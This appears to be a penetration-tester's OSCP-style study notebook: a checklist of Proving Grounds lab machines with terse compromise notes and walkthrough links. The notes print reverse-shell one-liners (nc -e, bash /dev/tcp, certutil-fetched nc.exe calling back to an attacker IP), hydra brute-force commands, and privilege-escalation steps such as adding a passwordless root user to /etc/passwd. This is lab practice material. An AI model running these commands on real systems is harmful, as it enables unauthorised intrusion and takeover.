### 8,9
- [x] helpdesk
- Direct exploit for manageengine in metasploit
- [ ] hetemit
- [ ] apex
- [x] xposedapi
- [x] reconstruction
- [x] slort
- [x] payday
- [x] uc404

### 10,11
- [ ] butch
- [ ] hepet
- [ ] hawat
- [ ] pebbles
- [ ] megavolt

### 12,13
- [ ] kevin
- [ ] shifty
- [ ] twiggy

### 14,15
- [ ] authby
- [ ] nickel
- [ ] phobos

### 16,17
- [ ] morbo
- [ ] nibbles
- [ ] billyboss
- [ ] escape

### 18
- [ ] nukem

### 19,20
- [ ] splodge
- [ ] internal
- [ ] wombo

### tre

found poprt 80 and 8082
gobuster 80 with common gace nothing except cms
gobuster with big gave mantis and adminer
gobuster on mantis gave config in which a.txt was present and mysql password was present
logged into mysql with this password and in user table got password of tre
ssh with tre got shell
no suid or sudo -l
one file writeable /usr/bin/check-system
wrote chmod +s /usr/bin/bash
restarted sudo shutdown -r now
/usr/bin/bash -p gave root shell

DC-4

found port 80 with loginpage
brute force found admin and happy
command page enabled
intecepted with burp
got nc shell using radio=ls+-l|nc -e /bin/bash 192.168.43.2 9898&submit=Run
found old-password.bak
brute force ssh 3 users with this file
hydra -L ~/Downloads/users.txt -P ~/Downloads/old-passwords.bak ssh://192.168.43.160
found password of jim and got ssh shell
found a mail file with charles password
su charles
found teehee in sudo -l
can append to a file
added a new root user to etc passwd without password
sudo teehee -a /etc/passwd
infosecadventures::0:0:root:/root:/bin/bash
su infosecadventures

### election1

found phpmyadmin in dirb, loged in with default rot:toor
found uname and pwd for election
in log file found one more password for love
ssh sheel with love
suid serv-u
found privsec exploit
compiled using xenspawn
got root

### nibbles

postgre running with defalut creds postgres:postgres
found direct exploit and got reverse shell
after found find with suid enabled
find . -exec /bin/sh -p \; -quit
got root

### billyboss

found a nexus login page tried bruteforcing but no success
created custom wordlist 

cewl http://192.168.181.61:8081/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://192.168.181.61:8081/ | grep -v CeWL  >> custom-wordlist.txt

brute force with custom wordlist and found password

hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.181.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'

nexus exploit on searchsploit

uploaded nc on the machine using the exploit

```python
CMD='certutil.exe -urlcache -split -f http://192.168.45.5/nc.exe nc.exe'

CMD='.\\\\nc.exe 192.168.45.5 443 -e cmd.exe'

```

Seimpersonate privilige enabled, used godpotato


### exfilterated

got initial shell using rce for subrion and also by sitemap generation in CMS

exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.45.222/80 0>&1'");

for privesc

cat /etc/crontab

exiftool running every minute

https://lipa.tech/posts/pg-exfiltrated/

### pelican

zookeeper running
initial shell gained
gcore for privesc

### boolean

initial access by registering and then user[confirmed] = true
puting public key in .ssh as authorized_keys
privesc by alias
ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true

### clue
freeswitch on port 8021, exploit on searchsploit but need credentials
cassandra web exploit from searchsploit working found creds but nit working for ssh
smb listing shows backup
crackmapexec smb 192.168.169.240 -u '' -p '' --shares
https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2

### cockpit

https://medium.com/@0xrave/cockpit-proving-ground-practice-walkthrough-c95930e9523d
sudo masscan "10.10.10.241" -p1-65535,U:1-65535 --rate=500 -e tun0

### codo

https://medium.com/@ardian.danny/oscp-practice-series-5-proving-grounds-codo-76bbc5819b11cd /root

crane

https://medium.com/@Cleto_A/pg-practice-crane-acdde3e29b75

### extplorer

https://deathflash.xyz/blog/pg-practice-extplorer

glpi

https://medium.com/@ardian.danny/oscp-practice-series-17-proving-grounds-glpi-555ce2d9234e

### hub


https://medium.com/@0xrave/hub-proving-ground-practice-62c79b07704e

### image

https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152

law

https://medium.com/@0xrave/law-proving-ground-practice-walkthrough-bc9d7f7b2941

### marshalled

subdomain enumeration
ffuf -H "Host: FUZZ.marshalled.pg" -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.214.237 -fs 868

### PC

https://medium.com/@0xrave/pc-proving-grounds-practice-walkthrough-7619983c7d63

### plum

https://medium.com/@0xrave/plum-proving-grounds-practice-walkthrough-d196185a6fd8

### pyloader

https://github.com/JacobEbben/CVE-2023-0297/blob/main/exploit.py

### rubydome

https://r4j3sh.medium.com/rubydome-pg-practice-writeup-7749fe58bbe5

### zipper

https://medium.com/@huwanyu94/proving-grounds-practice-zipper-walkthrough-6567efee48bf